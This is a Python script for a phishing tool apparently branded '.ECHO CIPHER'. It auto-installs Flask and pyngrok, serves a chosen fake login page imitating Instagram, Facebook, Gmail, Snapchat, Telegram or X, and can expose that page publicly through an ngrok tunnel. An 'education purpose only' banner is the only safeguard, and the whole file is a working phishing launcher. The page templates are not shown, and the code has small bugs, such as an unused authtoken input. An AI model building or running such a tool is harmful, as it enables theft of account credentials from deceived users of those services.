import logging
from importlib import import_module as eximport
from subprocess import run
import os, platform, time
from requests import head

def cleaar():
    if platform.system() == "Windows":
        os.system("cls") 

    else:
        os.system("clear")

def is_internet():
    try:
        head("https://google.com", timeout=5)

    except ConnectionError:
            print(f"\n{purple}No internet!\a")
            time.sleep(2)

    except Exception as e:
        print(termcolor.colored(f"{str(e)}", "red"))

cleaar()

green="\033[0;32m"
purple="\033[0;35m"

modules = ["flask", "pyngrok", "termcolor", "pyfiglet"]

for module in modules:
    try:
        eximport(module)

    except ImportError:
        try:
            print(f"{green} Installing {module} {purple}")
            run(f"pip3 install {module}", shell=True)
            time.sleep(1)
            cleaar()

        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)

    except:
        exit(1)


from flask import Flask, render_template, abort
from pyngrok import ngrok
import termcolor, random, pyfiglet


app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

print(termcolor.colored("\n\nUsed for education purpose Only! \n", "red", "on_yellow"))
print(termcolor.colored("Python Phisher Initializing... \n", "yellow", "on_green"))
text = [".ECHO", ".ECHO CIPHER", ".Echo Cipher"]
text = random.choice(text)
ascii_art = pyfiglet.figlet_format(text)
color = ["green", "yellow", "white", "cyan", "blue", "light_red", "magenta"]
print(termcolor.colored(ascii_art, random.choice(color)))

por = int(input(termcolor.colored("Enter port number here: ", "cyan")))
e = input(termcolor.colored("Enter: ", "green")).lower()

optiosn = {
        "insta": "instagram.html",
        "meta": "facebook.html",
        "gmail": "gmail.html",
        "snap": "snapchat.html",
        "tele": "telegram.html",
        "x": "x.html",
    }
    
if e in optiosn:
    pass

else:
    # abort(404)
    # raise ValueError(f"{e} not exists this type of Phishing page!")
    print(termcolor.colored("Invalid!", "red"))
    exit()

@app.route("/")
def hello_world():
    
    return render_template(f"{optiosn[e]}")

if __name__ == "__main__":
    sss = input(termcolor.colored("\n\nAre you want we start ngrok or you start itself Y for yes N for no!: ", "red"))

    if sss == "Y":
        is_internet()

        en = input(termcolor.colored("\nEnter ngrok authtoken: ", "blue"))
        
        public_url = ngrok.connect(por, "http")

        print(termcolor.colored(f"\n* Running on http://127.0.0.1:{por} \n", "light_green"))
        print(termcolor.colored(f"Public URL: {public_url} \n\n", "light_green"))

    else:
        print(termcolor.colored(f"\n* Running on http://127.0.0.1:{por} \n", "light_green"))

    app.run(port=por)